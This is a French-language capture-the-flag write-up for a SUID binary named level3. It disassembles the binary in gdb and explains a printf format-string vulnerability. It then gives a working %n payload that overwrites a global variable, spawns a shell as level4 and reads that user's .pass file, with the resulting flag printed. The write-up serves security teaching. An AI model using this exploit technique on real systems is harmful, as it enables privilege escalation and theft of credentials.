## Analyse

- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
  [...]
  ```
    - On a un binaire appartenant a level4 dans le home avec les droits SUID.

- `./level3`
  ```
    
  ```
  - Le programme attend un input
    - `test`
      - `test`
    - Le programme affiche le paramètre qu'on lui donne

- `gdb level3`
  - `set disassembly-flavor intel`
  - `info function`
    ```asm
    [...]
      0x080484a4  v
      0x0804851a  main
    [...]
    ```
    - on trouve une fonction v en plus du main
  - `disas main`
    ```asm
    Dump of assembler code for function main:
      0x0804851a <+0>:	push   ebp
      0x0804851b <+1>:	mov    ebp,esp
      0x0804851d <+3>:	and    esp,0xfffffff0
      0x08048520 <+6>:	call   0x80484a4 <v>
      0x08048525 <+11>:	leave
      0x08048526 <+12>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire, alignement de la stack<br/><br/>
    - <+6>
      - Call la fonction v()<br/><br/>
    - <+11> ... <+12>
      - Réinitialisation de la mémoire, fin d'exécution<br/><br/>
    - La fonction main() ne fait rien d'autre qu'appeler v()<br/><br/>
    
  - `disas v`
    ```asm
    Dump of assembler code for function v:
      0x080484a4 <+0>:	push   ebp
      0x080484a5 <+1>:	mov    ebp,esp
      0x080484a7 <+3>:	sub    esp,0x218
      0x080484ad <+9>:	mov    eax,ds:0x8049860
      0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
      0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
      0x080484be <+26>:	lea    eax,[ebp-0x208]
      0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
      0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
      0x080484cc <+40>:	lea    eax,[ebp-0x208]
      0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
      0x080484d5 <+49>:	call   0x8048390 <printf@plt>
      0x080484da <+54>:	mov    eax,ds:0x804988c
      0x080484df <+59>:	cmp    eax,0x40
      0x080484e2 <+62>:	jne    0x8048518 <v+116>
      0x080484e4 <+64>:	mov    eax,ds:0x8049880
      0x080484e9 <+69>:	mov    edx,eax
      0x080484eb <+71>:	mov    eax,0x8048600
      0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
      0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
      0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
      0x08048504 <+96>:	mov    DWORD PTR [esp],eax
      0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
      0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
      0x08048513 <+111>:	call   0x80483c0 <system@plt>
      0x08048518 <+116>:	leave
      0x08048519 <+117>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire (libère 536 octets pour la stack)<br/><br/>
    - <+9> ... <+35>
      - Stocke dans eax la valeur de l'adresse 0x8049860 dans le data segment register
        - `x/s 0x8049860`
          - `0x8049860 <stdin@@GLIBC_2.0>:	 ""`
      - Stocke la valeur de eax (stdin) dans la stack (à esp + 8)
      - Stocke 0x200 (512) dans la stack (à esp + 4)
      - Stocke dans eax la valeur à ebp - 520 => esp + 16
      - Stocke la valeur de eax (valeur à l'adresse ebp - 520) dans la stack (à esp)
      - Call fgets() avec les arguments stockés dans la stack<br/><br/>
    - <+40> ... <+49>
      - Fait pointer eax sur ebp - 520 => l'adresse du retour de fgets()
      - Stocke eax (l'adresse ebp - 520) sur la stack (à esp)
      - Call printf avec l'argument stocké sur la stack<br/><br/>
    - <+54> ... <+62>
      - Stocke dans eax la valeur de l'adresse 0x804988c dans le data segment register
        - `x/s 0x804988c`
          - `0x804988c <m>:	 ""`
      - Compare la valeur de eax (la globale m) avec 0x40 (64)
      - Jump à <+116> si la comparaison est fausse<br/><br/>
    - <+64> ... <+99>
      - Stocke dans eax la valeur de l'adresse 0x8049880 dans le data segment register
        - `x/s 0x8049880`
          - `0x8049880 <stdout@@GLIBC_2.0>:	 " ", <incomplete sequence \375\267>`
      - Stocke eax dans edx
      - Stocke dans eax la valeur de l'adresse 0x8048600
        - `x/s 0x8048600`
          - `0x8048600:	 "Wait what?!\n"`
      - Stocke edx (stdout) sur la stack (à esp + 12)
      - Stocke 0xc (12) sur la stack (à esp + 8)
      - Stocke 0x1 (1) sur la stack (à esp + 4)
      - Stocke la valeur de eax ("Wait what?!\n") sur la stack (à esp)
      - Call fwrite() avec les arguments stockés sur la stack<br/><br/>
    - <+104> ... <+111>
      - Stocke la valeur à l'adresse 0x804860d sur la stack (à esp)
        - `x/s 0x804860d`
          - `0x804860d:	 "/bin/sh"`
      - Call system() avec l'argument stocké sur la stack<br/><br/>
    - <+116> ... <+117> <= Jump conditionnel depuis <+62>
      - Réinitialisation de la mémoire, fin d'exécution


## Exploit

On comprend grâce à l'analyse que pour pouvoir avoir notre shell il va falloir donner à la globale 'm' (à l'adresse 0x804988c) la valeur 64, sinon on sort direct du programme.

On fait appel à deux fonctions avant la comparaison:
- fgets(buffer, 512, stdin), qui est protégé d'un buffer overflow puisqu'il ne lira jamais plus de 511 octets
- printf(buffer), ici par contre le printf est vulnérable à un [exploit de format string](https://cs155.stanford.edu/papers/formatstring-1.2.pdf#page=11)

On cherche le nombre de paramètres a demander pour que printf() commence a prendre ses arguments sur le début de notre format string:
- `echo 'AAAA%x.%x.%x.%x.%x' | ./level3`
  ```
  AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825
  ```
    - On remarque que printf arrive bien sur le début de notre format string (`41414141` => `AAAA`), au quatrième paramètre
- On peut donc choisir une adresse à afficher: `python -c 'print "\x8c\x98\x04\x08 %4$x"' | ./level3`
  ```
  � 804988c
  ```
Maintenant qu'on sait comment y accéder, on va se servir du [modifier %n de printf](https://docs.microsoft.com/en-us/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-functions?view=msvc-170), qui prend un pointeur sur entier en paramètre (notre adresse) et y écrit le nombre d'octets précédemment affichés par printf.
- `python -c 'print "\x8c\x98\x04\x08%1$60d%4$n"' | ./level3`
  - Ici, on affiche l'adresse (4 octets) et le premier paramètre de la stack (0x200) avec un padding de 60 (60 octets)
  - Puis on dit a printf d'écrire le nombre d'octets écrits précédemment (donc 60 + 4) à l'adresse indiquée par le 4ème argument (qui est le début de notre format string: `0x804988c` en little endian)
    ```
    �                                                         512
    Wait what?!
    ```
    - Ca fonctionne, on n'a plus qu'a maintenir le shell ouvert avec cat:
      - `python -c 'print "\x8c\x98\x04\x08%1$60d%4$n"' > /tmp/exploit`
      - `cat /tmp/exploit - | ./level3`
        ```
        �                                                         512
        Wait what?!

        ```
        - `whoami`
          ```
          level4
          ```
          - `cat /home/user/level4/.pass`
            ```
            b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
            ```

